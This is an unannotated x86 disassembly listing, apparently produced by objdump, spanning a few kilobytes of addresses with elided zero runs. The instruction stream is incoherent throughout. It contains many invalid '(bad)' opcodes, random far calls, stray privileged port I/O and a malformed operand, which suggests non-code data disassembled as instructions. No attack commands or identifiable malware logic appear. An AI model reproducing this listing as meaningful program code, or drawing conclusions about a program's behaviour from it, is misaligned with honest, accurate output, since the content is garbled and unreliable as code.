  42dbb2:	jne    0x42dbc5
  42dbb4:	mov    eax,ds:0x55f90302
  42dbb9:	outs   dx,BYTE PTR ds:[esi]
  42dbba:	adc    cl,ch
  42dbbc:	call   0xd451:0x625aa0ed
  42dbc3:	shr    BYTE PTR ds:0x16f4c2ca,cl
  42dbc9:	fisubr WORD PTR [ebx+0x14]
  42dbcc:	mov    ah,0x66
  42dbce:	(bad)  
  42dbcf:	stc    
  42dbd0:	shr    DWORD PTR [eax-0x111c811f],cl
  42dbd6:	jbe    0x42dbb1
  42dbd8:	xchg   ecx,eax
  42dbd9:	test   eax,0xd7b2d85b
  42dbde:	sbb    ecx,ebx
  42dbe0:	aaa    
  42dbe1:	test   eax,0x2cfa8aca
  42dbe6:	ins    BYTE PTR es:[edi],dx
  42dbe7:	dec    ebp
  42dbe8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dbe9:	js     0x42dba6
  42dbeb:	icebp  
  42dbec:	out    0x37,al
  42dbee:	add    eax,edi
  42dbf0:	iret   
  42dbf1:	in     eax,0xf
  42dbf3:	mov    ecx,0x2faebff1
  42dbf8:	pop    edx
  42dbf9:	clc    
  42dbfa:	cdq    
  42dbfb:	add    ecx,DWORD PTR [eax-0x17]
  42dbfe:	shr    dh,cl
  42dc00:	jg     0x42db97
  42dc02:	pop    esp
  42dc03:	xchg   DWORD PTR [edx],edx
  42dc05:	pop    eax
  42dc06:	repz mov ecx,0x906ac5aa
  42dc0c:	inc    edi
  42dc0d:	out    0x1a,eax
  42dc0f:	cmp    edi,DWORD PTR [ecx+0x72]
  42dc12:	jbe    0x42dc23
  42dc14:	jmp    0x527c7801
  42dc19:	xor    eax,0x607ab28e
  42dc1e:	sahf   
  42dc1f:	fisub  DWORD PTR [ecx]
  42dc21:	test   ch,cl
  42dc23:	jne    0x42dc0b
  42dc25:	ss jg  0x42dc4a
  42dc28:	gs push ss
  42dc2a:	jmp    0xa4f4:0xd8ca0bb2
  42dc31:	inc    edi
  42dc32:	xchg   ebx,eax
  42dc33:	cld    
  42dc34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dc35:	xor    eax,0xbf5d287d
  42dc3a:	jbe    0x42dc86
  42dc3c:	imul   esi,ecx,0x6b
  42dc3f:	hlt    
  42dc40:	bound  ebp,QWORD PTR [edx+0x3d97281b]
  42dc46:	pop    edx
  42dc47:	pushf  
  42dc48:	ror    cl,1
  42dc4a:	aad    0xc
  42dc4c:	sbb    esp,0x12
  42dc4f:	inc    esp
  42dc50:	jmp    0x42dc2b
  42dc52:	mov    bh,0xfb
  42dc54:	jo     0x42dc87
  42dc56:	sub    BYTE PTR [edi+0x6],ch
  42dc59:	ret    
  42dc5a:	or     BYTE PTR [eax+0xdaa0998],0xfd
  42dc61:	jb     0x42dc74
  42dc63:	icebp  
  42dc64:	call   0xe0e3c292
  42dc69:	sti    
  42dc6a:	(bad)  
  42dc6b:	ficomp WORD PTR cs:[ecx]
  42dc6e:	jg     0x42dcd8
  42dc70:	pop    edx
  42dc71:	jl     0x42dc1c
  42dc73:	sub    BYTE PTR [ebx+0x19],bl
  42dc76:	sub    eax,edi
  42dc78:	int    0xee
  42dc7a:	push   esp
  42dc7b:	js     0x42dcd0
  42dc7d:	xor    eax,0x3cfc76b8
  42dc82:	mov    dl,0x79
  42dc84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dc85:	pop    ebp
  42dc86:	mov    edi,ebp
  42dc88:	lods   eax,DWORD PTR ds:[esi]
  42dc89:	test   al,0xd9
  42dc8b:	fisttp QWORD PTR [ebp+0xf7000b]
	...
  42dcf1:	add    BYTE PTR [eax],al
  42dcf3:	add    BYTE PTR [ecx],bh
  42dcf5:	mov    bh,0x6d
  42dcf7:	pxor   mm3,mm7
  42dcfa:	jnp    0x42dcb3
  42dcfc:	adc    BYTE PTR [eax],ch
  42dcfe:	jne    0x42dce6
  42dd00:	dec    ebx
  42dd01:	or     DWORD PTR [eax+0x27],0x1ea2c
  42dd08:	add    al,0x1
  42dd0a:	add    BYTE PTR [eax],al
  42dd0c:	arpl   WORD PTR [eax+edi*2-0x6fb71705],si
  42dd13:	xor    al,BYTE PTR [eax]
  42dd15:	(bad)  
  42dd16:	cmp    DWORD PTR [esp+edx*1],edx
  42dd19:	popa   
  42dd1a:	scas   al,BYTE PTR es:[edi]
  42dd1b:	mov    ah,0xb7
  42dd1d:	fiadd  WORD PTR [ebx-0x78e43d63]
  42dd23:	xlat   BYTE PTR ds:[ebx]
  42dd24:	mov    ebp,0x1149acb0
  42dd29:	(bad)  
  42dd2a:	daa    
  42dd2b:	ffreep st(2)
  42dd2d:	xchg   ecx,eax
  42dd2e:	push   esi
  42dd2f:	mov    ebp,DWORD PTR [eax]
  42dd31:	fimul  DWORD PTR [esi]
  42dd33:	xchg   esp,eax
  42dd34:	outs   dx,BYTE PTR ds:[esi]
  42dd35:	push   esi
  42dd36:	das    
  42dd37:	inc    esp
  42dd38:	push   ebx
  42dd39:	push   es
  42dd3a:	mov    DWORD PTR [esi+0x4c304304],esi
  42dd40:	je     0x42dd35
  42dd42:	in     eax,0xb
  42dd44:	cmp    al,0xc7
  42dd46:	loopne 0x42dce0
  42dd48:	mov    ebp,0x451ba50e
  42dd4d:	cwde   
  42dd4e:	mov    ebp,0x7c5e79c0
  42dd53:	jp     0x42dd13
  42dd55:	out    dx,al
  42dd56:	inc    ebp
  42dd57:	xor    al,BYTE PTR [ebx+0x693978dd]
  42dd5d:	push   0xffffffa3
  42dd5f:	iret   
  42dd60:	cld    
  42dd61:	jo     0x42dcf2
  42dd63:	test   eax,0x903e4d5d
  42dd68:	ja     0x42ddbd
  42dd6a:	ret    
  42dd6b:	dec    edx
  42dd6c:	or     ebp,ebx
  42dd6e:	or     edi,esp
  42dd70:	loopne 0x42dda9
  42dd72:	vpmullw ymm7,ymm1,ymm7
  42dd76:	xchg   esi,eax
  42dd77:	fimul  WORD PTR ds:0x7e1c06b4
  42dd7d:	and    ah,BYTE PTR [ebx+0x6daae52a]
  42dd83:	and    eax,0x991dedd0
  42dd88:	mov    ah,al
  42dd8a:	xlat   BYTE PTR ds:[ebx]
  42dd8b:	xchg   edx,eax
  42dd8c:	(bad)  
  42dd8d:	cmp    dh,bl
  42dd8f:	jmp    FWORD PTR [ecx-0x3c220754]
  42dd95:	sub    esp,DWORD PTR [eax+0xf]
  42dd98:	arpl   WORD PTR [edx-0x79],dx
  42dd9b:	lahf   
  42dd9c:	std    
  42dd9d:	xchg   esi,eax
  42dd9e:	or     DWORD PTR [eax+edx*4-0x36c13b09],ebp
  42dda5:	or     DWORD PTR [ebx+0x5],0xb61e0f86
  42ddac:	sub    edx,DWORD PTR [esp+esi*4]
  42ddaf:	sub    edi,DWORD PTR [ebp-0x62]
  42ddb2:	add    al,0xd0
  42ddb4:	mov    cl,0x90
  42ddb6:	fmul   QWORD PTR [esi]
  42ddb8:	cdq    
  42ddb9:	jp     0x42dd68
  42ddbb:	hlt    
  42ddbc:	ins    BYTE PTR es:[edi],dx
  42ddbd:	fist   DWORD PTR [ebx]
  42ddbf:	fadd   QWORD PTR [edx+0x76]
  42ddc2:	sar    DWORD PTR [ebp+0x7c683476],0xd8
  42ddc9:	push   ss
  42ddca:	cli    
  42ddcb:	push   edx
  42ddcc:	(bad)  
  42ddcd:	loopne 0x42de17
  42ddcf:	jb     0x42de1b
  42ddd1:	fldenv ds:0x5af8e38f
  42ddd7:	and    DWORD PTR [esi+0x7c9fd485],ebp
  42dddd:	xchg   BYTE PTR [edx+eax*1-0x71ad5649],ah
  42dde4:	mov    bh,0x59
  42dde6:	test   DWORD PTR [ebx-0x1e],esi
  42dde9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ddea:	xchg   ebp,eax
  42ddeb:	add    edx,DWORD PTR [ebx-0x7b]
  42ddee:	sbb    DWORD PTR [eax-0x5aac38d3],eax
  42ddf4:	xor    bl,dl
  42ddf6:	arpl   WORD PTR [edi+0x1e],ax
  42ddf9:	ins    DWORD PTR es:[edi],dx
  42ddfa:	xor    al,0xb
  42ddfc:	cmp    BYTE PTR ss:[ecx+0x50dc9e3b],dh
  42de03:	ins    DWORD PTR es:[edi],dx
  42de04:	test   BYTE PTR [eax+0x12],cl
  42de07:	iret   
  42de08:	loopne 0x42de1a
  42de0a:	sahf   
  42de0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42de0c:	jae    0x42ddce
  42de0e:	cmc    
  42de0f:	sldt   WORD PTR [eax]
	...
  42de72:	add    BYTE PTR [eax],al
  42de74:	out    0x82,al
  42de76:	lods   eax,DWORD PTR ds:[esi]
  42de77:	xor    ebp,ebp
  42de79:	aas    
  42de7a:	(bad)  
  42de7b:	xlat   BYTE PTR ds:[ebx]
  42de7c:	fist   DWORD PTR [ebp-0x79]
  42de7f:	das    
  42de80:	adc    al,0xc2
  42de82:	mov    al,0x63
  42de84:	xor    bl,ch
  42de86:	add    DWORD PTR [eax],eax
  42de88:	add    al,0x1
  42de8a:	add    BYTE PTR [eax],al
  42de8c:	outs   dx,BYTE PTR ds:[esi]
  42de8d:	and    DWORD PTR [ebx],ecx
  42de8f:	xchg   esi,eax
  42de90:	loopne 0x42de2e
  42de92:	loope  0x42debc
  42de94:	(bad)  
  42de95:	xchg   ebx,eax
  42de96:	xor    BYTE PTR [edi+0x3f],ch
  42de99:	inc    esp
  42de9a:	inc    edi
  42de9b:	inc    esi
  42de9c:	arpl   WORD PTR [esi+0x6ce5f229],di
  42dea2:	out    dx,al
  42dea3:	inc    eax
  42dea4:	mov    eax,0xe00b48c3
  42dea9:	xchg   DWORD PTR [eax+0x15],edx
  42deac:	xchg   esi,eax
  42dead:	sub    al,0x7f
  42deaf:	inc    ebp
  42deb0:	stos   BYTE PTR es:[edi],al
  42deb1:	dec    ecx
  42deb2:	mov    eax,0x347d51a
  42deb7:	add    al,0x2b
  42deb9:	and    al,0xa
  42debb:	jecxz  0x42de62
  42debd:	adc    ecx,edx
  42debf:	pop    ds
  42dec0:	cmp    al,0xc6
  42dec2:	mov    edx,0xf3dd82e0
  42dec7:	test   DWORD PTR [ecx+0x1cbf5187],edx
  42decd:	jmp    0x42de8b
  42decf:	mov    ecx,0xd478ff28
  42ded4:	push   ebp
  42ded5:	pop    esi
  42ded6:	sbb    DWORD PTR [ebx+ecx*4+0x3a918ec5],ecx
  42dedd:	mov    dh,0xbe
  42dedf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dee0:	addr16 push ds
  42dee2:	repnz rcr esi,cl
  42dee5:	jmp    0x42df3a
  42dee7:	mov    ecx,0x63bc08d8
  42deec:	stos   DWORD PTR es:[edi],eax
  42deed:	les    eax,FWORD PTR [ebx-0x36]
  42def0:	out    dx,al
  42def1:	push   0x5f626e4e
  42def6:	sbb    dl,BYTE PTR [ebx+0x45fa4f8e]
  42defc:	sub    al,dl
  42defe:	pop    esi
  42deff:	cmp    esp,DWORD PTR [esi+0x5a]
  42df02:	nop
  42df03:	daa    
  42df04:	pop    ecx
  42df05:	(bad)  
  42df07:	lods   al,BYTE PTR ds:[esi]
  42df08:	jmp    0xeb16:0x8ac12562
  42df0f:	mov    eax,0x98372952
  42df14:	(bad)  
  42df15:	cli    
  42df16:	sahf   
  42df17:	out    0x3e,eax
  42df19:	out    0xfe,eax
  42df1b:	xchg   ecx,eax
  42df1c:	mov    eax,0xa2f52937
  42df21:	mov    bl,0x70
  42df23:	test   DWORD PTR [ebp+0x5],esi
  42df26:	dec    ecx
  42df27:	push   cs
  42df28:	inc    esp
  42df29:	arpl   bx,dx
  42df2b:	mov    DWORD PTR [edx+eax*2],esi
  42df2e:	test   al,0x8
  42df30:	push   0xfffffff1
  42df32:	xor    al,0x52
  42df34:	pop    ss
  42df35:	call   0xfd95:0x1e9b095b
  42df3c:	push   esp
  42df3d:	bnd jb 0x42dfbf
  42df40:	xchg   esp,eax
  42df41:	dec    ebp
  42df42:	jmp    0x42defc
  42df44:	sti    
  42df45:	sti    
  42df46:	mov    ds:0x784036c2,eax
  42df4b:	in     al,0x76
  42df4d:	pop    esi
  42df4e:	clc    
  42df4f:	sub    eax,0x1a3e1dbf
  42df54:	add    al,0x69
  42df56:	add    ah,BYTE PTR [ebx+0x9]
  42df59:	xchg   ecx,eax
  42df5a:	mov    dl,BYTE PTR [edi+edi*2]
  42df5d:	and    edi,DWORD PTR [ebx-0x3df29e44]
  42df63:	and    eax,0x38def37
  42df68:	adc    ecx,eax
  42df6a:	cmp    eax,0xf48f44d2
  42df6f:	aam    0xe7
  42df71:	mov    gs,WORD PTR [eax+ebp*1+0x737cc1f2]
  42df78:	xchg   esi,eax
  42df79:	loope  0x42dff2
  42df7b:	add    bl,BYTE PTR [ebx-0x2c]
  42df7e:	ins    BYTE PTR es:[edi],dx
  42df7f:	mov    ebx,0xe1e8b745
  42df84:	mov    bh,0x91
  42df86:	add    dl,al
  42df88:	sub    eax,0x77b54075
  42df8d:	jmp    DWORD PTR [ebp+0x0]
	...
  42dff1:	add    BYTE PTR [eax],al
  42dff3:	add    BYTE PTR [edx],al
  42dff5:	(bad)  
  42dff6:	jb     0x42df9e
  42dff8:	(bad)  
  42dff9:	scas   al,BYTE PTR es:[edi]
  42dffa:	(bad)  
  42dffb:	dec    BYTE PTR [edi-0x30]
  42dffe:	fisttp WORD PTR [esi+0x73]
  42e001:	test   BYTE PTR [eax],dl
  42e003:	mov    cl,0x34
  42e005:	in     al,dx
  42e006:	add    DWORD PTR [eax],eax
  42e008:	add    al,0x1
  42e00a:	add    BYTE PTR [eax],al
  42e00c:	adc    al,0xc5
  42e00e:	cs je  0x42e077
  42e011:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e012:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e013:	(bad)  
  42e014:	sub    ebp,DWORD PTR [ecx]
  42e016:	xlat   BYTE PTR ds:[ebx]
  42e017:	iret   
  42e018:	(bad)  
  42e01a:	jb     0x42e025
  42e01c:	cmp    DWORD PTR [ecx],edx
  42e01e:	and    ebp,DWORD PTR [ebx-0x1f57a8da]
  42e024:	fisttp QWORD PTR [esi]
  42e026:	loopne 0x42e03a
  42e028:	pop    esp
  42e02a:	nop
  42e02b:	js     0x42dfbc
  42e02d:	mov    ?,WORD PTR [edx]
  42e02f:	fstp   DWORD PTR [edi-0x23bdbfca]
  42e035:	cmp    ebp,DWORD PTR ds:0x92073b70
  42e03b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e03c:	jne    0x42e07c
  42e03e:	ret    
  42e03f:	jecxz  0x42e070
  42e041:	jno    0x42e07e
  42e043:	and    ebp,DWORD PTR [edi+0x2d]
  42e046:	int3   
  42e047:	and    eax,0x64057a4a
  42e04c:	mov    ecx,0xb1583363
  42e051:	inc    ebx
  42e052:	or     edi,edi
  42e054:	sbb    esi,DWORD PTR [ebx]
  42e056:	daa    
  42e057:	add    BYTE PTR ds:0xc6852e3,0xe4
  42e05e:	div    dl
  42e060:	xchg   esi,eax
  42e061:	jo     0x42e0cd
  42e063:	push   esi
  42e064:	push   esp
  42e065:	call   0xb9a5:0xe17aa077
  42e06c:	inc    ebx
  42e06d:	test   al,0xa3
  42e06f:	pop    ecx
  42e070:	push   esp
  42e071:	xlat   BYTE PTR ds:[ebx]
  42e072:	lods   al,BYTE PTR ds:[esi]
  42e073:	mov    eax,0x3d952ffb
  42e078:	or     eax,0x974e7433
  42e07d:	fidivr DWORD PTR [esi+ebx*2-0x19]
  42e081:	add    al,0x7
  42e083:	out    dx,al
  42e084:	shl    DWORD PTR [ebp-0x36],cl
  42e087:	adc    eax,0xf8b601cc
  42e08c:	ins    BYTE PTR es:[edi],dx
  42e08d:	scas   al,BYTE PTR es:[edi]
  42e08e:	mov    ds:0xc819bb3e,al
  42e093:	or     ebx,eax
  42e095:	fiadd  DWORD PTR ds:0x2df384aa
  42e09b:	repnz lds edx,FWORD PTR [ebx-0x2a416c0f]
  42e0a2:	xchg   esi,eax
  42e0a3:	mov    edi,0xfe4b10d2
  42e0a8:	shl    BYTE PTR [ebx],0x84
  42e0ab:	dec    edx
  42e0ac:	and    esp,DWORD PTR [ebx+0x21daa2b5]
  42e0b2:	rcr    DWORD PTR [ebp-0x4208f49],cl
  42e0b8:	arpl   WORD PTR [edi+0x6b02c4b2],sp
  42e0be:	fistp  DWORD PTR [ecx+0x56ea3dab]
  42e0c4:	sub    DWORD PTR [eax-0x5f],edi
  42e0c7:	cwde   
  42e0c8:	sub    eax,0x9ac6c9c4
  42e0cd:	shl    BYTE PTR [ebx],0xb0
  42e0d0:	ret    0xa7d2
  42e0d3:	or     BYTE PTR [esi-0x53652dd6],bl
  42e0d9:	call   0x26a4:0x2b315fe3
  42e0e0:	sar    DWORD PTR [eax+0x698cba10],cl
  42e0e6:	add    DWORD PTR [eax+0x5399653e],esp
  42e0ec:	mov    dl,0xa9
  42e0ee:	test   BYTE PTR [ebp+0x18a9b648],bh
  42e0f4:	jne    0x42e10a
  42e0f6:	fldenv [ecx+0x2ea3d86f]
  42e0fc:	out    0xc4,eax
  42e0fe:	shl    BYTE PTR [eax-0x19],1
  42e101:	or     BYTE PTR [esi+0x34],bl
  42e104:	daa    
  42e105:	sahf   
  42e106:	mov    ecx,gs
  42e108:	inc    ecx
  42e109:	lea    edx,[eax]
  42e10b:	mov    edi,eax
  42e10d:	test   DWORD PTR [edi+0x3b],ebp
	...
  42e173:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e179:	xlat   BYTE PTR ds:[ebx]
  42e17a:	mov    ecx,0x35bb80ef
  42e17f:	xchg   edi,eax
  42e180:	ins    DWORD PTR es:[edi],dx
  42e181:	dec    esi
  42e182:	popa   
  42e183:	pop    eax
  42e184:	cmp    ch,ch
  42e186:	add    DWORD PTR [eax],eax
  42e188:	add    al,0x1
  42e18a:	add    BYTE PTR [eax],al
  42e18c:	adc    edx,DWORD PTR [ebx+0x763d1a2c]
  42e192:	jae    0x42e18d
  42e194:	dec    ebp
  42e195:	inc    ecx
  42e196:	pop    edx
  42e197:	cmp    BYTE PTR [esi+0x5d],0x46
  42e19b:	fs icebp 
  42e19d:	push   eax
  42e19e:	xchg   DWORD PTR [edi+0x34],edx
  42e1a1:	mov    esp,0x5e748f5e
  42e1a6:	and    eax,0xffffff81
  42e1a9:	jle    0x42e1bd
  42e1ab:	out    dx,al
  42e1ac:	repz test DWORD PTR [eax],ebx
  42e1af:	test   al,0xed
  42e1b2:	add    BYTE PTR ds:0x6f8426e2,bh
  42e1b8:	outs   dx,BYTE PTR ds:[esi]
  42e1b9:	and    DWORD PTR [ebx-0x200bd30],eax
  42e1bf:	mov    esi,0xe346fbc2
  42e1c4:	mov    WORD PTR [ecx+0x4c],es
  42e1c7:	xchg   edi,eax
  42e1c8:	das    
  42e1c9:	outs   dx,BYTE PTR ds:[esi]
  42e1ca:	stos   DWORD PTR es:[edi],eax
  42e1cb:	inc    edi
  42e1cc:	sub    al,0x97
  42e1ce:	test   BYTE PTR [edx+edi*2-0x80],ch
  42e1d2:	adc    dl,BYTE PTR [esi-0x23]
  42e1d5:	call   0x6bab:0xc8ac371c
  42e1dc:	scas   al,BYTE PTR es:[edi]
  42e1dd:	xchg   edx,eax
  42e1de:	sbb    eax,0x5068ea2f
  42e1e3:	sub    BYTE PTR [ebx],ch
  42e1e5:	pop    dx
  42e1e7:	mov    cl,0x79
  42e1e9:	gs aam 0x72
  42e1ec:	ficomp WORD PTR [edx+eax*2+0x34]
  42e1f0:	popf   
  42e1f1:	add    eax,0xf116e69b
  42e1f6:	xlat   BYTE PTR ds:[ebx]
  42e1f7:	ficom  WORD PTR [ebx+0x68e1a56a]
  42e1fd:	retf   
  42e1fe:	adc    esp,ebx
  42e200:	scas   al,BYTE PTR es:[edi]
  42e201:	xchg   edx,eax
  42e202:	adc    edi,edi
  42e204:	cld    
  42e205:	dec    edi
  42e206:	push   ebx
  42e207:	jns    0x42e1d4
  42e209:	jmp    0x7f68e004
  42e20e:	mov    bh,0x73
  42e210:	es and esp,ecx
  42e213:	dec    esi
  42e214:	and    DWORD PTR [ebx+0x4aa26480],ecx
  42e21a:	mov    al,0xeb
  42e21c:	jmp    0x42e21a
  42e21e:	sbb    bh,bl
  42e220:	jmp    0x3717d6e2
  42e225:	mov    eax,0xe60adae
  42e22a:	shl    eax,0xea
  42e22d:	mov    bl,0x33
  42e22f:	mov    ds:0xa45d86e7,al
  42e234:	stos   DWORD PTR es:[edi],eax
  42e235:	pop    edi
  42e236:	fwait
  42e237:	sub    BYTE PTR [edi+ecx*8+0x39],al
  42e23b:	and    bl,BYTE PTR [edi]
  42e23d:	mov    eax,DWORD PTR [esi]
  42e23f:	mov    ecx,0xb40958f7
  42e244:	sub    al,0xfe
  42e246:	add    BYTE PTR [eax],dl
  42e248:	in     eax,dx
  42e249:	mov    ds:0x8497d39c,eax
  42e24e:	push   es
  42e24f:	mov    es,WORD PTR [edx]
  42e251:	lods   eax,DWORD PTR ds:[esi]
  42e252:	mov    dl,0x10
  42e254:	test   DWORD PTR [eax-0x1d35ccb7],esp
  42e25a:	sub    DWORD PTR [edx-0x2a],ebp
  42e25d:	ss mov esi,ebx
  42e260:	xor    edi,DWORD PTR [edi]
  42e262:	xor    al,0xa1
  42e264:	xchg   ebx,eax
  42e265:	dec    esi
  42e266:	scas   eax,DWORD PTR es:[edi]
  42e267:	xchg   DWORD PTR [ebp-0x67],edx
  42e26a:	xchg   ebp,eax
  42e26b:	pop    edx
  42e26c:	out    0x93,al
  42e26e:	les    esi,FWORD PTR [edi-0x46ede692]
  42e274:	jne    0x42e27a
  42e276:	dec    ebp
  42e277:	mov    cl,0x3f
  42e279:	push   edx
  42e27a:	mov    bl,0x69
  42e27c:	in     al,0xb5
  42e27e:	loopne 0x42e21e
  42e280:	bound  ebx,QWORD PTR [ecx+0x50]
  42e283:	push   ss
  42e284:	leave  
  42e285:	jp     0x42e290
  42e287:	inc    esp
  42e288:	jecxz  0x42e29c
  42e28a:	cmp    edi,DWORD PTR [edx+0x38]
  42e28d:	xchg   esp,eax
  42e28e:	jp     0x42e2f7
	...
  42e2f4:	lods   eax,DWORD PTR ds:[esi]
  42e2f5:	cmp    eax,0xb79aa78a
  42e2fa:	lods   eax,DWORD PTR ds:[esi]
  42e2fb:	aas    
  42e2fc:	mov    ebx,0xcb199140
  42e301:	(bad)  
  42e302:	aad    0x92
  42e304:	cmp    al,0xee
  42e306:	add    DWORD PTR [eax],eax
  42e308:	add    al,0x1
  42e30a:	add    BYTE PTR [eax],al
  42e30c:	and    BYTE PTR [edx],bh
  42e30e:	jno    0x42e308
  42e310:	jp     0x42e2d5
  42e312:	ds std 
  42e314:	dec    esp
  42e315:	fild   WORD PTR [esi+ebx*8]
  42e318:	es pop edi
  42e31a:	or     BYTE PTR [edi-0x6a],ah
  42e31d:	inc    edi
  42e31e:	imul   BYTE PTR [esi+0x7f]
  42e321:	stc    
  42e322:	imul   DWORD PTR [ebx+0x25561f2d]
  42e328:	jno    0x42e331
  42e32a:	xor    ebp,DWORD PTR [eax-0x3f]
  42e32d:	ins    DWORD PTR es:[edi],dx
  42e32e:	cmp    BYTE PTR [edi+0x3376c15c],bh
  42e334:	or     ah,BYTE PTR [ecx]
  42e336:	neg    DWORD PTR [eax-0x5b]
  42e339:	or     eax,0xb59656b2
  42e33e:	jecxz  0x42e2e0
  42e340:	shl    BYTE PTR [esi+0x7a6872f8],0x70
  42e347:	mov    ds:0x4fb4fcd1,al
  42e34c:	sub    eax,0x857fa2ab
  42e351:	imul   ebp,esi,0x32
  42e354:	test   DWORD PTR cs:[ebp+esi*1+0x68add9d],edi
  42e35c:	sbb    BYTE PTR [edi+0xc],0xb0
  42e360:	sbb    BYTE PTR [ebx-0xd],bh
  42e363:	es sbb al,0xdd
  42e366:	cmc    
  42e367:	sbb    DWORD PTR [esi-0x26e8562b],esp
  42e36d:	jae    0x42e316
  42e36f:	fistp  DWORD PTR [edi]
  42e371:	mov    edx,0xc281f151
  42e376:	jnp    0x42e363
  42e378:	jp     0x42e3dd
  42e37a:	fdivr  QWORD PTR [edx-0x531ca7f3]
  42e380:	out    0x9a,al
  42e382:	mov    cl,0x8a
  42e384:	jge    0x42e3fd
  42e386:	gs jne 0x42e38b
  42e389:	sub    ecx,DWORD PTR [ebx+0x7]
  42e38c:	xchg   esi,eax
  42e38d:	test   DWORD PTR [ecx],edx
  42e38f:	out    dx,al
  42e390:	mov    eax,ds:0x2973bc86
  42e395:	jmp    0x42e38d
  42e397:	neg    eax
  42e399:	test   BYTE PTR [edx+ecx*1-0x1c],bl
  42e39d:	add    eax,0x457e54ea
  42e3a2:	inc    ebp
  42e3a3:	aad    0x98
  42e3a5:	dec    ebx
  42e3a6:	add    DWORD PTR [edi+0x1deb0ce0],esp
  42e3ac:	adc    ah,BYTE PTR [esi]
  42e3ae:	and    ch,cl
  42e3b0:	mov    esi,0xb866f74d
  42e3b5:	mov    ds:0x5fd6cdea,al
  42e3ba:	add    BYTE PTR [eax+0x7e891017],bl
  42e3c0:	clc    
  42e3c1:	fimul  WORD PTR [ecx-0x3477cf9b]
  42e3c7:	test   DWORD PTR [edx],esi
  42e3c9:	xchg   ecx,eax
  42e3ca:	ja     0x42e354
  42e3cc:	arpl   WORD PTR [edi],cx
  42e3ce:	push   edi
  42e3cf:	xchg   ecx,eax
  42e3d0:	xchg   BYTE PTR [edx],al
  42e3d2:	jbe    0x42e39b
  42e3d4:	out    dx,al
  42e3d5:	lock test DWORD PTR [ebx+0x46],edi
  42e3d9:	lock sbb DWORD PTR [ebx+0x4ca40153],edi
  42e3e0:	cwde   
  42e3e1:	pop    esp
  42e3e2:	mov    DWORD PTR ds:0x4cfee11f,esi
  42e3e8:	mov    cl,0x0
  42e3ea:	loopne 0x42e45a
  42e3ec:	es je  0x42e3d6
  42e3ef:	loopne 0x42e3e3
  42e3f1:	mov    ebp,0xf1deee4
  42e3f6:	xchg   esp,eax
  42e3f7:	out    dx,al
  42e3f8:	test   DWORD PTR [ebx+0x3d],edx
  42e3fb:	cmp    DWORD PTR [eax],ecx
  42e3fd:	ror    DWORD PTR [edx],0x98
  42e400:	mov    bl,0xa2
  42e402:	fwait
  42e403:	out    0x87,al
  42e405:	add    BYTE PTR [edi+eax*8-0x3c8fdc],ch
  42e40c:	sar    dh,1
  42e40e:	mov    esi,0xb6
	...
  42e473:	add    dl,ah
  42e475:	mov    ebp,0xe7dfc7dc
  42e47a:	sti    
  42e47b:	mov    ebp,0xe093f290
  42e480:	in     al,0xca
  42e482:	push   cs
  42e483:	add    DWORD PTR [eax-0x11],0x1040001
  42e48a:	add    BYTE PTR [eax],al
  42e48c:	jge    0x42e417
  42e48e:	in     al,0x1e
  42e490:	ficom  WORD PTR [esi+0xa]
  42e493:	inc    esi
  42e494:	mov    bh,dh
  42e496:	push   edi
  42e497:	add    al,0x9d
  42e499:	stc    
  42e49a:	inc    ebx
  42e49b:	(bad)  
  42e49c:	or     BYTE PTR [edi+0x59],0x2d
  42e4a0:	xor    ebp,DWORD PTR [ecx+0x18]
  42e4a3:	push   esi
  42e4a4:	push   edx
  42e4a5:	ds inc ebx
  42e4a7:	out    dx,al
  42e4a8:	adc    DWORD PTR [ebx-0x37f6de18],0x6b1bcc10
  42e4b2:	or     DWORD PTR [eax],esp
  42e4b4:	sbb    cl,bl
  42e4b6:	xchg   ecx,eax
  42e4b7:	out    0x47,al
  42e4b9:	test   al,0xbb
  42e4bb:	and    dl,al
  42e4bd:	shl    bh,1
  42e4bf:	or     edx,DWORD PTR [ebp-0x1f]
  42e4c2:	push   ss
  42e4c3:	pop    ds
  42e4c4:	dec    edi
  42e4c5:	cmp    bh,BYTE PTR ds:0xe43dcf54
  42e4cb:	into   
  42e4cc:	and    dl,BYTE PTR ds:[eax]
  42e4cf:	lds    esp,FWORD PTR [ebx-0x424f7d01]
  42e4d5:	lock sbb ebx,DWORD PTR [edx-0x5e1063a5]
  42e4dc:	add    BYTE PTR [eax],cl
  42e4de:	dec    ebx
  42e4df:	dec    ebx
  42e4e0:	xchg   BYTE PTR [edi-0x25387ca6],ah
  42e4e6:	lock jo 0x42e4f6
  42e4e9:	pop    esp
  42e4ea:	jmp    DWORD PTR [eax+0x15]
  42e4ed:	inc    esp
  42e4ee:	add    al,0x9f
  42e4f0:	xlat   BYTE PTR ds:[ebx]
  42e4f1:	xchg   edi,eax
  42e4f2:	das    
  42e4f3:	clc    
  42e4f4:	xchg   edi,eax
  42e4f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e4f6:	jne    0x42e525
  42e4f8:	xor    edi,eax
  42e4fa:	loop   0x42e53f
  42e4fc:	js     0x42e514
  42e4fe:	jns    0x42e4b0
  42e500:	add    al,BYTE PTR [ecx-0x67]
  42e503:	sub    al,ah
  42e505:	inc    BYTE PTR [ecx-0x45ff7ac3]
  42e50b:	xor    BYTE PTR [edx+0x5e68569c],cl
  42e511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e512:	jge    0x42e4c4
  42e514:	inc    ecx
  42e515:	and    esp,DWORD PTR [ebx]
  42e517:	sub    al,ah
  42e519:	mov    ah,BYTE PTR [edi-0x387a3d31]
  42e51f:	push   esi
  42e520:	push   cs
  42e521:	push   esp
  42e522:	mov    edx,0xe0364557
  42e527:	jnp    0x42e55d
  42e529:	xor    ah,BYTE PTR [ecx-0x1a]
  42e52c:	or     esi,edi
  42e52e:	inc    esp
  42e52f:	push   ebx
  42e530:	push   esi
  42e531:	test   BYTE PTR ds:0x7fe8ddb,ch
  42e537:	push   ebp
  42e538:	jecxz  0x42e558
  42e53a:	inc    edi
